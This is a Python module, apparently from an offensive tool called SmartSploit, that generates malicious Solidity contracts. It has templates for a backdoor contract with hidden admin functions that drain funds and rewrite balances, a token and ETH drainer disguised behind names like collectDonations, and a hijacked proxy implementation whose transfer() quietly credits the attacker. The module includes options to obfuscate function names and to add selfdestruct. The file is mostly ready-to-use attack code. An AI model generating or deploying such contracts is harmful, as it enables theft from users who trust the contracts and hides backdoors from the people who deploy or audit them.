"""
Demo Payload Module
Template for generating malicious smart contracts and payloads
"""

from smartsploit.lib.base_module import PayloadModule, ExecutionResult
import logging

logger = logging.getLogger(__name__)

class DemoGenericPayload(PayloadModule):
    """Demo module for generating generic malicious payloads"""
    
    def __init__(self):
        super().__init__()
        self.name = "demo/generic/backdoor_contract"
        self.description = "Demo generic backdoor contract payload generator"
        self.author = "SmartSploit Team"
        self.version = "1.0"
        self.payload_type = "backdoor"
        
        # Module targets
        self.targets = [
            "Ethereum contracts needing backdoor access",
            "DeFi protocols for privilege escalation",
            "Token contracts for unauthorized minting"
        ]
        
        # References
        self.references = [
            "https://swcregistry.io/docs/SWC-118",
            "https://consensys.github.io/smart-contract-best-practices/"
        ]
        
        # Required options
        self.required_options = ["ATTACKER_ADDRESS"]
        
        # Default options
        self.options = {
            "ATTACKER_ADDRESS": "",
            "PAYLOAD_TYPE": "backdoor",  # backdoor, drainer, proxy_hijack
            "SOLIDITY_VERSION": "0.8.19",
            "INCLUDE_SELFDESTRUCT": False,
            "OBFUSCATE_CODE": False,
            "TARGET_TOKEN": "",
            "HIDDEN_FUNCTION": True
        }
    
    def info(self):
        """Return module information"""
        base_info = super().info()
        base_info.update({
            'payload_type': self.payload_type,
            'supported_types': [
                'backdoor - Hidden admin functions',
                'drainer - Token/ETH draining contract', 
                'proxy_hijack - Proxy implementation hijack'
            ]
        })
        return base_info
    
    def check(self):
        """Check if all requirements are met"""
        if not super().check():
            return False
            
        attacker = self.get_option("ATTACKER_ADDRESS")
        if not attacker.startswith("0x") or len(attacker) != 42:
            logger.error("Invalid attacker address format")
            return False
            
        return True
    
    def generate_backdoor_contract(self):
        """Generate backdoor contract with hidden admin functions"""
        contract_template = f"""
pragma solidity ^{self.get_option('SOLIDITY_VERSION')};

contract BackdoorContract {{
    address private owner;
    address private hiddenAdmin = {self.get_option('ATTACKER_ADDRESS')};
    mapping(address => uint256) public balances;
    
    modifier onlyOwner() {{
        require(msg.sender == owner, "Not owner");
        _;
    }}
    
    modifier onlyHiddenAdmin() {{
        require(msg.sender == hiddenAdmin, "Access denied");
        _;
    }}
    
    constructor() {{
        owner = msg.sender;
    }}
    
    function deposit() external payable {{
        balances[msg.sender] += msg.value;
    }}
    
    function withdraw(uint256 amount) external {{
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }}
    
    // Hidden backdoor function
    function {self._get_hidden_function_name()}(address target, uint256 amount) external onlyHiddenAdmin {{
        require(address(this).balance >= amount, "Insufficient contract balance");
        payable(target).transfer(amount);
    }}
    
    // Hidden balance manipulation
    function {self._get_hidden_function_name()}2(address target, uint256 newBalance) external onlyHiddenAdmin {{
        balances[target] = newBalance;
    }}
    
    // Emergency drain function
    function {self._get_hidden_function_name()}3() external onlyHiddenAdmin {{
        payable(hiddenAdmin).transfer(address(this).balance);
    }}
    
    {self._get_selfdestruct_function() if self.get_option('INCLUDE_SELFDESTRUCT') else ''}
}}
"""
        return contract_template.strip()
    
    def generate_drainer_contract(self):
        """Generate token/ETH draining contract"""
        contract_template = f"""
pragma solidity ^{self.get_option('SOLIDITY_VERSION')};

interface IERC20 {{
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}}

contract DrainerContract {{
    address private attacker = {self.get_option('ATTACKER_ADDRESS')};
    
    // Drain ETH from victims
    function collectDonations() external payable {{
        // Appears innocent but drains to attacker
        payable(attacker).transfer(address(this).balance);
    }}
    
    // Drain specific ERC20 tokens
    function drainToken(address token, address victim, uint256 amount) external {{
        require(msg.sender == attacker, "Unauthorized");
        IERC20(token).transferFrom(victim, attacker, amount);
    }}
    
    // Batch drain multiple tokens
    function batchDrain(address[] calldata tokens, address victim) external {{
        require(msg.sender == attacker, "Unauthorized");
        for (uint i = 0; i < tokens.length; i++) {{
            uint256 balance = IERC20(tokens[i]).balanceOf(victim);
            if (balance > 0) {{
                IERC20(tokens[i]).transferFrom(victim, attacker, balance);
            }}
        }}
    }}
    
    receive() external payable {{
        payable(attacker).transfer(msg.value);
    }}
}}
"""
        return contract_template.strip()
    
    def generate_proxy_hijack(self):
        """Generate proxy implementation hijack payload"""
        contract_template = f"""
pragma solidity ^{self.get_option('SOLIDITY_VERSION')};

contract MaliciousImplementation {{
    address private attacker = {self.get_option('ATTACKER_ADDRESS')};
    
    // Storage layout must match original to avoid conflicts
    mapping(address => uint256) private balances;
    uint256 private totalSupply;
    address private admin;
    
    // Hijacked function that appears normal
    function transfer(address to, uint256 amount) external returns (bool) {{
        // Secretly transfer to attacker instead
        balances[msg.sender] -= amount;
        balances[attacker] += amount;
        return true;
    }}
    
    // Hidden admin functions
    function emergencyWithdraw() external {{
        require(msg.sender == attacker, "Unauthorized");
        payable(attacker).transfer(address(this).balance);
    }}
    
    function updateAttacker(address newAttacker) external {{
        require(msg.sender == attacker, "Unauthorized");
        attacker = newAttacker;
    }}
    
    // Fallback to steal all ETH sent to contract
    receive() external payable {{
        payable(attacker).transfer(msg.value);
    }}
}}
"""
        return contract_template.strip()
    
    def _get_hidden_function_name(self):
        """Generate obfuscated function name if enabled"""
        if self.get_option("OBFUSCATE_CODE"):
            return f"system_update_{hex(hash(self.get_option('ATTACKER_ADDRESS')) % 10000)[2:]}"
        return "backdoorTransfer"
    
    def _get_selfdestruct_function(self):
        """Generate selfdestruct function if enabled"""
        return f"""
    // Emergency self-destruct
    function emergencyShutdown() external onlyHiddenAdmin {{
        selfdestruct(payable(hiddenAdmin));
    }}
"""
    
    def obfuscate_code(self, code):
        """Apply code obfuscation if enabled"""
        if not self.get_option("OBFUSCATE_CODE"):
            return code
            
        # TODO: Implement actual obfuscation
        # - Rename variables with random names
        # - Add dummy functions
        # - Split logic across multiple functions
        
        return code
    
    def generate(self):
        """Generate payload based on type"""
        payload_type = self.get_option("PAYLOAD_TYPE")
        
        if payload_type == "backdoor":
            contract = self.generate_backdoor_contract()
        elif payload_type == "drainer":
            contract = self.generate_drainer_contract()
        elif payload_type == "proxy_hijack":
            contract = self.generate_proxy_hijack()
        else:
            raise ValueError(f"Unknown payload type: {payload_type}")
        
        # Apply obfuscation if enabled
        contract = self.obfuscate_code(contract)
        
        self.payload_size = len(contract.encode('utf-8'))
        return contract
    
    def run(self):
        """Generate and return payload"""
        try:
            logger.info(f"Generating {self.get_option('PAYLOAD_TYPE')} payload...")
            
            if not self.check():
                return ExecutionResult(False, "Prerequisites not met")
            
            payload = self.generate()
            
            message = f"Generated {self.get_option('PAYLOAD_TYPE')} payload ({self.payload_size} bytes)"
            
            return ExecutionResult(True, message, {
                "payload": payload,
                "size": self.payload_size,
                "type": self.get_option("PAYLOAD_TYPE"),
                "attacker": self.get_option("ATTACKER_ADDRESS"),
                "features": {
                    "hidden_functions": self.get_option("HIDDEN_FUNCTION"),
                    "selfdestruct": self.get_option("INCLUDE_SELFDESTRUCT"),
                    "obfuscated": self.get_option("OBFUSCATE_CODE")
                }
            })
                
        except Exception as e:
            logger.error(f"Payload generation failed: {str(e)}")
            return ExecutionResult(False, f"Payload error: {str(e)}")

# Module registration
def get_module():
    return DemoGenericPayload()